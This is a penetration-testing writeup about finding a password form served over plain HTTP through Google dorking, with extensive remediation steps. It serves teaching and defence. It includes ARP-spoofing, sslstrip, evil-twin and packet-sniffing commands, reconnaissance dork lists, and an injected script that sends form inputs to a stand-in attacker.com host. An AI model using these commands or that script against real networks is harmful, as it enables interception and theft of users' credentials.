# Penetration Testing Writeup: Google Dorking for Insecure HTTP Web Pages

> **Writeup Classification**: This is a standard penetration testing writeup documenting the discovery of insecure HTTP web pages through OSINT reconnaissance. Identifying unencrypted pages handling sensitive data represents a critical security misconfiguration enabling man-in-the-middle attacks and data interception.

***

## üìã Engagement Overview

| **Test Type** | OSINT / Reconnaissance - Transport Layer Security Assessment |
| :-- | :-- |
| **Methodology** | Google Dorking for HTTP vs HTTPS Protocol Detection |
| **Target Domain** | target.com |
| **Test Date** | 2025-12-27 |
| **Vulnerability Type** | Sensitive Data Transmitted Over Unencrypted Channels |
| **Severity** | High (Credential Interception via Man-in-the-Middle) |


***

## üéØ Executive Summary

During OSINT reconnaissance operations, Google Dorking techniques successfully identified web pages served over insecure HTTP protocol instead of encrypted HTTPS. The discovered HTTP page contained an HTML form collecting highly sensitive user information including full name, email, phone number, and password. Since the page uses HTTP, all form submissions are transmitted in plaintext, enabling trivial interception by network attackers through man-in-the-middle (MITM) attacks. This represents a critical security misconfiguration violating modern security standards and compliance requirements.

**Key Findings**:

1. Insecure HTTP page indexed by Google (protocol downgrade)
2. Sensitive data collection form served over unencrypted connection
3. Password transmission in plaintext
4. Lack of transport layer security (TLS/SSL)
5. Browser security warnings visible (crossed-out padlock)

**Attack Vector**: Network interception, man-in-the-middle attack, credential harvesting

***

## üîç Vulnerability Background: HTTP vs HTTPS Security

### What is HTTP?

HTTP (Hypertext Transfer Protocol) is the foundation protocol of web communication. It defines how messages are formatted and transmitted between web browsers and servers. However, HTTP was designed in the early 1990s without security considerations and transmits all data in plaintext.

**HTTP Characteristics**:

- **Port**: 80 (default)
- **URL Format**: `http://example.com`
- **Encryption**: None - all data in plaintext
- **Authentication**: None - cannot verify server identity
- **Integrity**: None - data can be modified in transit
- **Browser Indicator**: "Not Secure" warning


### What is HTTPS?

HTTPS (HTTP Secure) is HTTP with an added security layer using SSL/TLS protocols. The "S" stands for "Secure" and indicates that all communication is encrypted.

**HTTPS Characteristics**:

- **Port**: 443 (default)
- **URL Format**: `https://example.com`
- **Encryption**: TLS 1.2/1.3 (industry standard)
- **Authentication**: Digital certificates verify server identity
- **Integrity**: Cryptographic signatures prevent tampering
- **Browser Indicator**: Padlock icon (secure connection)


### How SSL/TLS Encryption Works

**Encryption Process**:

```
1. Client initiates HTTPS connection (ClientHello)
2. Server responds with SSL/TLS certificate (ServerHello)
3. Client validates certificate against Certificate Authority (CA)
4. Client and server negotiate encryption algorithms
5. Secure session key established via Diffie-Hellman key exchange
6. All subsequent data encrypted with session key
```

**Encrypted vs Unencrypted Request**:

**HTTP (Plaintext)**:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=SuperSecret123
```

**Anyone monitoring network traffic can read**: `username=admin&password=SuperSecret123`

**HTTPS (Encrypted)**:

```
[Encrypted TLS data - unreadable without decryption key]
17 03 03 00 5a 8f a2 b4 c7 d1 e5 f9 3a 6e 82 95 ...
[Random-looking bytes that cannot be interpreted without the encryption key]
```

**Network attacker sees**: Random encrypted data, cannot extract credentials

***

## üö® Security Risks of Unencrypted HTTP

### 1. Man-in-the-Middle (MITM) Attacks

**Attack Definition**: An attacker intercepts communication between client and server, eavesdropping or modifying data in transit.

**Common MITM Techniques**:

#### A. ARP Spoofing (Local Network Attack)

```bash
# Attacker on same WiFi network
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: ARP spoofing (pretend to be the gateway)
arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1

# Step 3: Capture traffic with tcpdump or Wireshark
tcpdump -i wlan0 -A -s 0 'tcp port 80'

# Step 4: Extract credentials from captured HTTP traffic
tcpdump -i wlan0 -A -s 0 'tcp port 80' | grep -E 'username|password|email'
```

**Result**: All HTTP traffic from victim (192.168.1.100) flows through attacker, fully readable.

#### B. DNS Spoofing

```bash
# Attacker controls DNS responses
# Victim requests: http://bank.com
# Attacker returns: 203.0.113.66 (attacker's IP)

# Set up rogue DNS server
dnsmasq --address=/bank.com/203.0.113.66
```

**Result**: Victim connects to attacker's fake website over HTTP.

#### C. SSL Stripping (Protocol Downgrade Attack)

```
# Victim requests: https://example.com
# Attacker intercepts and rewrites to: http://example.com
# Victim sees HTTP page, sends credentials in plaintext
# Attacker forwards to real https://example.com and steals credentials

# Tool: sslstrip
sslstrip -l 8080
```

**Result**: Even if user intends to use HTTPS, attacker downgrades connection to HTTP.

### 2. Wireless Network Interception

**Public WiFi Risk**:

- Coffee shop WiFi
- Airport networks
- Hotel internet
- Conference center WiFi

**Attack Scenario**:

```
Attacker sets up WiFi access point named "Free Airport WiFi"
Victim connects and browses http://email-provider.com
Victim logs in with username and password
Attacker captures credentials using packet sniffer
```

**Tool: Wireshark HTTP Filter**:

```
# Capture HTTP POST requests with passwords
http.request.method == "POST" && (http contains "password" || http contains "passwd")

# Extract form data from captured packets
Follow TCP Stream ‚Üí View form submission data
```

**Impact**: Trivial credential theft on public networks.

### 3. ISP and Corporate Network Monitoring

**Who Can See HTTP Traffic**:

- Internet Service Providers (ISPs)
- Corporate network administrators
- Government surveillance programs
- Network appliances (firewalls, proxy servers)
- Any router between client and server

**HTTP vs HTTPS Visibility**:


| **Information** | **HTTP (Visible)** | **HTTPS (Hidden)** |
| :-- | :-- | :-- |
| Domain visited | ‚úÖ Visible | ‚úÖ Visible (DNS/SNI) |
| Full URL path | ‚úÖ Visible | ‚ùå Encrypted |
| Form data | ‚úÖ Visible | ‚ùå Encrypted |
| Passwords | ‚úÖ Visible | ‚ùå Encrypted |
| Session cookies | ‚úÖ Visible | ‚ùå Encrypted |
| Page content | ‚úÖ Visible | ‚ùå Encrypted |

### 4. Content Injection and Modification

**HTTP Traffic Manipulation**:

```javascript
// Attacker injects malicious JavaScript into HTTP response
<script>
  // Steal all form inputs
  document.querySelectorAll('input').forEach(input => {
    input.addEventListener('change', () => {
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({
          name: input.name,
          value: input.value
        })
      });
    });
  });
</script>
```

**Attack Capabilities**:

- Inject malware download links
- Add keyloggers to pages
- Modify banking transaction amounts
- Insert phishing forms
- Redirect users to malicious sites

**HTTPS Protection**: TLS integrity checks prevent tampering.

### 5. Compliance and Legal Violations

**Regulatory Requirements Violated by HTTP**:

#### GDPR (General Data Protection Regulation)

- **Article 32**: Technical and organizational measures to ensure security
- **Requirement**: Encryption of personal data in transit
- **Penalty**: Up to ‚Ç¨20 million or 4% of global annual revenue


#### PCI DSS (Payment Card Industry Data Security Standard)

- **Requirement 4.1**: Use strong cryptography for transmission of cardholder data
- **Consequence**: Loss of payment processing certification
- **Penalty**: \$5,000-\$100,000 per month of non-compliance


#### HIPAA (Health Insurance Portability and Accountability Act)

- **Security Rule**: Administrative, physical, and technical safeguards for PHI
- **Requirement**: Encryption of electronic health information in transit
- **Penalty**: \$100-\$50,000 per violation, up to \$1.5 million annually


### OWASP \& CWE Classification

- **OWASP**: A02:2021 ‚Äì Cryptographic Failures
- **OWASP ASVS**: V9.1 - Sensitive Data Not Sent in URL
- **CWE-319**: Cleartext Transmission of Sensitive Information
- **CWE-523**: Unprotected Transport of Credentials
- **CWE-311**: Missing Encryption of Sensitive Data

***

## üé¨ Step-by-Step Attack Execution

### Phase 1: Google Dorking for HTTP Pages

**Objective**: Identify web pages served over insecure HTTP protocol

**Query Construction**:

```
site:target.com AND -inurl:"https"
```

**Query Component Analysis**:


| **Component** | **Function** | **Pentester Value** |
| :-- | :-- | :-- |
| `site:target.com` | Domain restriction  | Limits search to authorized target scope |
| `AND` | Boolean conjunction  | Requires both conditions be met |
| `-inurl:"https"` | Negative URL filter  | Excludes pages with "https" in URL |

**Query Logic**:

- The minus sign (`-`) is a negation operator in Google search
- `-inurl:"https"` means "exclude URLs containing 'https'"
- Result: Only HTTP URLs are returned (those without "https")

**Alternative Query Formats**:

```
# Explicit HTTP protocol search
site:target.com inurl:"http://"

# Negative HTTPS filter (same as primary)
site:target.com -inurl:https

# Exclude secure protocol entirely
site:target.com -https

# Combined with form detection
site:target.com -inurl:https intext:"password"
```


### Phase 2: Search Execution and HTTP Page Discovery

**Action**: Execute query in Google Search

**Command**:

```
site:target.com AND -inurl:"https"
```

**Result**: One insecure HTTP page discovered

**Discovered URL**:

```
http://target.com/register
```

**Initial Observations**:

- **Protocol**: HTTP (not HTTPS)
- **Endpoint**: `/register` (user registration page)
- **Browser Warning**: Padlock icon crossed out with red line
- **Security Status**: "Not Secure" label in browser address bar


### Phase 3: Page Analysis and Sensitive Data Identification

**Action**: Access the discovered HTTP page to examine content

**URL Access**:

```
http://target.com/register
```

**Page Content Analysis**:

**HTML Form Structure**:

```html
<!DOCTYPE html>
<html>
<head>
    <title>User Registration</title>
</head>
<body>
    <h1>Create New Account</h1>
    
    <!-- INSECURE: Form action uses HTTP -->
    <form method="POST" action="http://target.com/api/register">
        
        <label for="fullname">Full Name:</label>
        <input type="text" id="fullname" name="fullname" required />
        
        <label for="email">Email Address:</label>
        <input type="email" id="email" name="email" required />
        
        <label for="phone">Phone Number:</label>
        <input type="tel" id="phone" name="phone" required />
        
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required />
        
        <button type="submit">Register</button>
    </form>
</body>
</html>
```

**Sensitive Data Fields Identified**:


| **Field** | **Data Type** | **Sensitivity Level** | **Regulatory Classification** |
| :-- | :-- | :-- | :-- |
| Full Name | PII | High | GDPR Personal Data  |
| Email Address | PII | High | GDPR Personal Data, CAN-SPAM  |
| Phone Number | PII | High | GDPR Personal Data, TCPA |
| Password | Authentication Credential | Critical | PCI DSS, HIPAA (if applicable)  |

### Phase 4: Traffic Interception Demonstration

**Attack Simulation**: Man-in-the-Middle credential capture

**Attacker Setup** (for authorized testing):

**Step 1: Network Positioning**

```bash
# Attacker on same network segment as victim
# Enable packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure ARP spoofing to intercept traffic
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

**Step 2: Packet Capture**

```bash
# Capture HTTP traffic with tcpdump
sudo tcpdump -i eth0 -A -s 0 'tcp port 80 and host 192.168.1.100' -w capture.pcap

# Alternative: Use Wireshark with display filter
# Display Filter: http.request.method == "POST"
```

**Step 3: Victim Submits Form**

```
User fills out registration form:
- Full Name: John Doe
- Email: john.doe@example.com
- Phone: +1-555-0123
- Password: MySecureP@ss2024

User clicks "Register" button
Browser sends HTTP POST request
```

**Step 4: Captured HTTP Request**:

```http
POST /api/register HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

fullname=John+Doe&email=john.doe%40example.com&phone=%2B1-555-0123&password=MySecureP%40ss2024
```

**Decoded Form Data**:

```
fullname=John Doe
email=john.doe@example.com
phone=+1-555-0123
password=MySecureP@ss2024
```

**Critical Finding**: All credentials transmitted in plaintext, fully readable by network attacker.

### Phase 5: Impact Analysis - Real-World Attack Scenarios

#### Scenario 1: Public WiFi Attack

**Attack Vector**: Evil Twin Access Point

```bash
# Attacker creates fake WiFi named "Starbucks WiFi Free"
hostapd evil_twin.conf

# Victim connects to fake AP
# All HTTP traffic flows through attacker
# Credentials captured via:
tcpdump -i wlan0 -A -s 0 'tcp port 80' | grep -E 'password|passwd'
```

**Victim Experience**:

- Connects to seemingly legitimate WiFi
- Browses to registration page (HTTP)
- Submits form with credentials
- Attacker captures: name, email, phone, password

**Exploitation**:

- Credential stuffing on other services
- Identity theft using PII
- Account takeover attempts


#### Scenario 2: Corporate Network Compromise

**Attack Vector**: Compromised router or network appliance

```bash
# Attacker gains access to corporate router
# Installs packet sniffer
tcpdump -i eth0 'port 80' -w corporate_traffic.pcap

# Analyzes captured traffic offline
wireshark corporate_traffic.pcap
# Filter: http.request.method == "POST" && http contains "password"
```

**Impact**:

- All employee credentials on HTTP sites exposed
- Long-term credential harvesting
- Lateral movement using stolen credentials


#### Scenario 3: ISP-Level Surveillance

**Capability**: ISPs can monitor all HTTP traffic

```
ISP logging infrastructure captures:
- Full URLs visited (http://site.com/register)
- All form submissions
- Usernames and passwords
- Personal information
```

**Privacy Implications**:

- User activity profiling
- Data retention for years
- Government data requests
- Potential data breaches of ISP logs

***

## üõ†Ô∏è Extended Google Dork Arsenal for HTTP/HTTPS Detection

### Comprehensive Protocol Security Queries

#### 1. Basic HTTP Page Discovery

```
# Primary query
site:target.com AND -inurl:"https"

# Alternative formats
site:target.com -inurl:https
site:target.com inurl:"http://"
site:target.com -https

# Exclude both HTTP and HTTPS to find protocol-relative URLs
site:target.com -inurl:http
```


#### 2. Forms Over HTTP

```
# Generic form detection
site:target.com -inurl:https intext:"<form"
site:target.com -inurl:https intext:"password"
site:target.com -inurl:https intext:"login"

# Registration forms
site:target.com -inurl:https (intext:"register" OR intext:"sign up")

# Login forms (critical finding)
site:target.com -inurl:https intext:"<form" AND intext:"password"

# Contact forms with PII
site:target.com -inurl:https (intext:"email" AND intext:"phone")
```


#### 3. Authentication Pages Over HTTP

```
# Login pages
site:target.com -inurl:https inurl:login
site:target.com -inurl:https inurl:signin
site:target.com -inurl:https inurl:auth

# Admin panels (critical security risk)
site:target.com -inurl:https inurl:admin
site:target.com -inurl:https inurl:dashboard
site:target.com -inurl:https inurl:console

# Password reset pages
site:target.com -inurl:https inurl:"reset-password"
site:target.com -inurl:https inurl:"forgot-password"
```


#### 4. E-commerce and Payment Pages

```
# Shopping cart (PCI DSS violation)
site:target.com -inurl:https inurl:cart
site:target.com -inurl:https inurl:checkout
site:target.com -inurl:https inurl:payment

# Account management
site:target.com -inurl:https inurl:account
site:target.com -inurl:https inurl:profile
site:target.com -inurl:https inurl:billing
```


#### 5. API Endpoints Over HTTP

```
# REST API detection
site:target.com -inurl:https inurl:api
site:target.com -inurl:https inurl:/v1/
site:target.com -inurl:https inurl:/api/v2/

# GraphQL endpoints
site:target.com -inurl:https inurl:graphql

# JSON responses
site:target.com -inurl:https filetype:json
```


#### 6. Subdomain HTTP Discovery

```
# All subdomains without HTTPS
site:*.target.com -inurl:https

# Specific subdomain types
site:api.target.com -inurl:https
site:dev.target.com -inurl:https
site:staging.target.com -inurl:https
site:admin.target.com -inurl:https
site:portal.target.com -inurl:https
```


#### 7. Mixed Content Detection

```
# Pages that may load resources over HTTP
site:target.com inurl:https intext:"http://"

# Detect mixed content in source code
site:target.com inurl:https intext:"src=\"http://"
site:target.com inurl:https intext:"href=\"http://"
```


***

## üéØ Pentester's HTTP/HTTPS Security Assessment Methodology

### Systematic Protocol Security Testing

#### Phase 1: Automated Subdomain Enumeration

**Tool: Amass**

```bash
# Discover all subdomains
amass enum -passive -d target.com -o subdomains.txt

# Check protocol for each subdomain
while read subdomain; do
    echo "Testing: $subdomain"
    
    # Test HTTP
    http_status=$(curl -s -o /dev/null -w "%{http_code}" "http://$subdomain")
    
    # Test HTTPS
    https_status=$(curl -s -o /dev/null -w "%{http_code}" "https://$subdomain")
    
    if [ "$http_status" == "200" ] && [ "$https_status" != "200" ]; then
        echo "[!] HTTP ONLY: $subdomain"
    elif [ "$http_status" == "200" ] && [ "$https_status" == "200" ]; then
        echo "[~] BOTH: $subdomain (potential misconfiguration)"
    fi
done < subdomains.txt
```


#### Phase 2: SSL/TLS Configuration Testing

**Tool: testssl.sh**

```bash
# Installation
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Comprehensive SSL/TLS assessment
./testssl.sh https://target.com

# Check for specific vulnerabilities
./testssl.sh --protocols https://target.com
./testssl.sh --cipher-per-proto https://target.com
./testssl.sh --vulnerabilities https://target.com

# Check HSTS (HTTP Strict Transport Security)
./testssl.sh --hsts https://target.com
```

**Key Security Checks**:

- TLS version support (should be TLS 1.2+)
- Weak cipher suites
- Certificate validity and chain
- HSTS header presence
- SSL/TLS vulnerabilities (POODLE, BEAST, Heartbleed)


#### Phase 3: HTTP to HTTPS Redirect Testing

**Test HTTP Redirect Behavior**:

```bash
# Check if HTTP redirects to HTTPS
curl -I http://target.com

# Expected (Secure):
HTTP/1.1 301 Moved Permanently
Location: https://target.com/

# Vulnerable (No redirect):
HTTP/1.1 200 OK
Content-Type: text/html
```

**Automated Redirect Testing Script**:

```python
#!/usr/bin/env python3
import requests

def test_http_redirect(domain):
    """Test if HTTP redirects to HTTPS"""
    http_url = f"http://{domain}"
    
    try:
        response = requests.get(http_url, allow_redirects=False, timeout=10)
        
        if response.status_code in [301, 302, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            
            if redirect_location.startswith('https://'):
                print(f"[+] SECURE: {domain} redirects HTTP to HTTPS")
                return True
            else:
                print(f"[!] VULNERABLE: {domain} redirects to non-HTTPS: {redirect_location}")
                return False
        elif response.status_code == 200:
            print(f"[!] VULNERABLE: {domain} serves content over HTTP without redirect")
            return False
        else:
            print(f"[?] Unknown status: {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Error testing {domain}: {e}")
        return None

# Test target
test_http_redirect("target.com")
```


#### Phase 4: Form Security Analysis

**Detect Forms Submitting Over HTTP**:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def analyze_forms(url):
    """Analyze forms for insecure submission"""
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        
        for i, form in enumerate(forms, 1):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            # Resolve relative URLs
            if action:
                action_url = urljoin(url, action)
            else:
                action_url = url
            
            # Check for password fields
            password_fields = form.find_all('input', {'type': 'password'})
            
            # Check for sensitive fields
            sensitive_fields = form.find_all('input', {
                'name': ['password', 'passwd', 'pwd', 'email', 'phone', 'ssn', 'credit']
            })
            
            print(f"\n[*] Form {i}:")
            print(f"    Action: {action_url}")
            print(f"    Method: {method}")
            print(f"    Password fields: {len(password_fields)}")
            print(f"    Sensitive fields: {len(sensitive_fields)}")
            
            # Security assessment
            if action_url.startswith('http://'):
                print(f"    [!] VULNERABLE: Form submits to HTTP (plaintext)")
            elif action_url.startswith('https://'):
                print(f"    [+] SECURE: Form submits to HTTPS")
            else:
                print(f"    [?] Unknown protocol: {action_url}")
            
            # Additional checks
            if password_fields and action_url.startswith('http://'):
                print(f"    [!!! CRITICAL: Password form over HTTP !!!]")
                
    except Exception as e:
        print(f"[!] Error analyzing forms: {e}")

# Usage
analyze_forms("http://target.com/register")
```


#### Phase 5: Mixed Content Detection

**Identify HTTPS Pages Loading HTTP Resources**:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

def detect_mixed_content(url):
    """Detect HTTP resources on HTTPS pages"""
    if not url.startswith('https://'):
        print("[!] URL must be HTTPS")
        return
    
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        mixed_content = []
        
        # Check images
        for img in soup.find_all('img'):
            src = img.get('src', '')
            if src.startswith('http://'):
                mixed_content.append(('Image', src))
        
        # Check scripts
        for script in soup.find_all('script'):
            src = script.get('src', '')
            if src.startswith('http://'):
                mixed_content.append(('Script', src))
        
        # Check stylesheets
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href', '')
            if href.startswith('http://'):
                mixed_content.append(('Stylesheet', href))
        
        # Check iframes
        for iframe in soup.find_all('iframe'):
            src = iframe.get('src', '')
            if src.startswith('http://'):
                mixed_content.append(('iFrame', src))
        
        if mixed_content:
            print(f"[!] Mixed content detected on {url}:")
            for resource_type, resource_url in mixed_content:
                print(f"    [{resource_type}] {resource_url}")
        else:
            print(f"[+] No mixed content detected on {url}")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Usage
detect_mixed_content("https://target.com/dashboard")
```


***

## üõ°Ô∏è Remediation Recommendations: Comprehensive Security Controls

### Critical Priority (Immediate Action Required)

#### Finding: Sensitive Data Form Served Over Insecure HTTP

**CVSS 3.1 Score**: 7.5 (High)

- **AV:N** (Network) - Exploitable by network attacker
- **AC:L** (Low) - Simple exploitation
- **PR:N** (None) - No authentication required
- **UI:N** (None) - No user interaction needed for interception
- **S:U** (Unchanged)
- **C:H** (High) - Complete credential disclosure
- **I:N** (None)
- **A:N** (None)

**CWE**: CWE-319 (Cleartext Transmission), CWE-523 (Unprotected Transport of Credentials)

***

### Remediation Step 1: Implement HTTPS Across Entire Site

**Immediate Actions**:

**1. Obtain SSL/TLS Certificate**:

**Option A: Let's Encrypt (Free, Automated)**:

```bash
# Install Certbot
sudo apt-get update
sudo apt-get install certbot python3-certbot-apache

# Obtain and install certificate
sudo certbot --apache -d target.com -d www.target.com

# Enable auto-renewal
sudo certbot renew --dry-run
```

**Option B: Commercial Certificate Authority**:

```bash
# Generate Certificate Signing Request (CSR)
openssl req -new -newkey rsa:2048 -nodes \
    -keyout hacking-web-applications.key \
    -out hacking-web-applications.csr

# Submit CSR to CA (DigiCert, Sectigo, GlobalSign)
# Download issued certificate and intermediate chain

# Install on web server
```

**2. Configure Web Server for HTTPS**:

**Apache Configuration**:

```apache
# /etc/apache2/sites-available/hacking-web-applications-ssl.conf

<VirtualHost *:443>
    ServerName target.com
    ServerAlias www.target.com
    
    DocumentRoot /var/www/html
    
    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/target.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/target.com/privkey.pem
    
    # Modern SSL configuration (Mozilla Intermediate)
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder off
    SSLSessionTickets off
    
    # Security headers
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "DENY"
    Header always set X-XSS-Protection "1; mode=block"
</VirtualHost>

# Redirect HTTP to HTTPS
<VirtualHost *:80>
    ServerName target.com
    ServerAlias www.target.com
    
    # Permanent redirect to HTTPS
    Redirect permanent / https://target.com/
</VirtualHost>
```

**Nginx Configuration**:

```nginx
# /etc/nginx/sites-available/target.com

# Redirect HTTP to HTTPS
server {
    listen 80;
    listen [::]:80;
    server_name target.com www.target.com;
    
    return 301 https://$host$request_uri;
}

# HTTPS server
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name target.com www.target.com;
    
    root /var/www/html;
    index index.html index.php;
    
    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/target.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/target.com/privkey.pem;
    
    # Modern SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers off;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    
    # SSL session cache
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
}
```

**3. Update Application URLs**:

**HTML Forms**:

```html
<!-- BEFORE (Vulnerable) -->
<form method="POST" action="http://target.com/api/register">

<!-- AFTER (Secure) -->
<form method="POST" action="https://target.com/api/register">

<!-- BEST PRACTICE (Protocol-relative) -->
<form method="POST" action="//target.com/api/register">
```

**Application Configuration**:

```php
// PHP configuration
define('SITE_URL', 'https://target.com');
define('FORCE_SSL', true);

// Force HTTPS redirect
if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    exit;
}
```

```python
# Django settings.py
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
```

```javascript
// Node.js/Express
app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
        res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
        next();
    }
});
```


***

### Remediation Step 2: Implement HTTP Strict Transport Security (HSTS)

**HSTS Header Configuration**:

**What is HSTS?**
HTTP Strict Transport Security (HSTS) is a security header that forces browsers to always use HTTPS connections. Once a browser sees the HSTS header, it will automatically convert all HTTP requests to HTTPS for the specified duration.

**Apache**:

```apache
# Enable headers module
sudo a2enmod headers

# Add HSTS header
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

# Breakdown:
# max-age=31536000: HSTS valid for 1 year (365 days)
# includeSubDomains: Apply to all subdomains
# preload: Eligible for browser preload list
```

**Nginx**:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**HSTS Benefits**:

- Prevents SSL stripping attacks
- Blocks protocol downgrade attacks
- Eliminates mixed content warnings
- Improves performance (no HTTP redirect needed after first visit)

**HSTS Preload List**:

```
# Submit to Chrome/Firefox/Safari preload list
https://hstspreload.org/

# Once preloaded, browsers NEVER attempt HTTP
# Even on first visit, always uses HTTPS
```

**Important**: Only enable HSTS after confirming HTTPS works correctly across all subdomains.

***

### Remediation Step 3: Fix Mixed Content Issues

**Identify Mixed Content**:

```bash
# Chrome DevTools Console will show warnings like:
# "Mixed Content: The page at 'https://example.com' was loaded over HTTPS, 
#  but requested an insecure image 'http://example.com/logo.png'"
```

**Solution 1: Update to HTTPS URLs**:

```html
<!-- Before -->
<img src="http://target.com/images/logo.png">
<script src="http://cdn.example.com/jquery.js"></script>

<!-- After -->
<img src="https://target.com/images/logo.png">
<script src="https://cdn.example.com/jquery.js"></script>
```

**Solution 2: Protocol-Relative URLs**:

```html
<!-- Automatically uses same protocol as page -->
<img src="//target.com/images/logo.png">
<script src="//cdn.example.com/jquery.js"></script>
```

**Solution 3: Content Security Policy (CSP)**:

```apache
# Block all mixed content
Header set Content-Security-Policy "upgrade-insecure-requests;"

# This automatically upgrades HTTP to HTTPS for all resources
```


***

### Remediation Step 4: Secure Cookie Configuration

**Set Secure Cookie Attributes**:

```php
// PHP - Set secure cookie flags
setcookie(
    'session_id', 
    $session_value,
    [
        'expires' => time() + 3600,
        'path' => '/',
        'domain' => 'target.com',
        'secure' => true,      // Only sent over HTTPS
        'httponly' => true,    // Not accessible via JavaScript
        'samesite' => 'Strict' // CSRF protection
    ]
);

// PHP session configuration
ini_set('session.cookie_secure', '1');     // HTTPS only
ini_set('session.cookie_httponly', '1');   // No JS access
ini_set('session.cookie_samesite', 'Strict');
```

```javascript
// Node.js/Express
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // No JS access
        maxAge: 3600000,   // 1 hour
        sameSite: 'strict' // CSRF protection
    }
}));
```

```python
# Django settings.py
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SECURE = True
```


***

### Remediation Step 5: Remove HTTP From Google Index

**Google Search Console**:

```
1. Log in to Google Search Console
2. Select property: target.com
3. Navigate to: Removals
4. Click: New Request
5. Enter URL: http://target.com/register
6. Select: "Remove all URLs with this prefix"
7. Submit request

# Verify removal after 24-48 hours
site:target.com -inurl:https
```

**robots.txt** (Temporary measure):

```
# /robots.txt
# Note: This doesn't prevent access, only indexing

User-agent: *
Disallow: /register
```

**Canonical Tags** (Signal preferred HTTPS version):

```html
<!-- On all pages, add canonical tag pointing to HTTPS -->
<link rel="canonical" href="https://target.com/register" />
```


***

## üîê Long-Term Security Hardening

### 1. Certificate Management and Monitoring

**Automated Certificate Renewal**:

```bash
# Certbot automatic renewal (Let's Encrypt)
sudo certbot renew --dry-run

# Cron job for renewal (twice daily checks recommended)
0 0,12 * * * root certbot renew --quiet

# Renewal hooks for service restart
sudo certbot renew --deploy-hook "systemctl reload apache2"
```

**Certificate Monitoring**:

```bash
# Check certificate expiration
echo | openssl s_client -servername target.com \
      -connect target.com:443 2>/dev/null | \
      openssl x509 -noout -dates

# Automated monitoring with SSL Labs
https://www.ssllabs.com/ssltest/analyze.html?d=target.com

# Alert on upcoming expiration
# Use services like:
# - Uptime Robot
# - Better Uptime
# - StatusCake
```


### 2. Continuous Security Assessment

**Automated HTTPS Verification**:

```python
#!/usr/bin/env python3
# /usr/local/bin/https-monitor.py

import requests
import smtplib

def check_https_enforcement(domain):
    """Verify HTTP redirects to HTTPS"""
    try:
        # Test HTTP
        http_response = requests.get(f"http://{domain}", allow_redirects=False, timeout=10)
        
        # Test HTTPS
        https_response = requests.get(f"https://{domain}", timeout=10)
        
        # Check redirect
        if http_response.status_code in [301, 302]:
            redirect_location = http_response.headers.get('Location', '')
            if redirect_location.startswith('https://'):
                print(f"[+] PASS: {domain} enforces HTTPS")
                return True
            else:
                print(f"[!] FAIL: {domain} redirects but not to HTTPS")
                send_alert(domain, "HTTP redirect not to HTTPS")
                return False
        else:
            print(f"[!] FAIL: {domain} does not redirect HTTP to HTTPS")
            send_alert(domain, "No HTTPS redirect")
            return False
            
    except Exception as e:
        print(f"[!] ERROR: {domain} - {e}")
        return None

def send_alert(domain, issue):
    """Send email alert"""
    # Configure email settings
    print(f"[!] ALERT: {domain} - {issue}")

# Run daily via cron
if __name__ == "__main__":
    domains = [
        "target.com",
        "api.target.com",
        "admin.target.com"
    ]
    
    for domain in domains:
        check_https_enforcement(domain)
```

**Cron Schedule**:

```bash
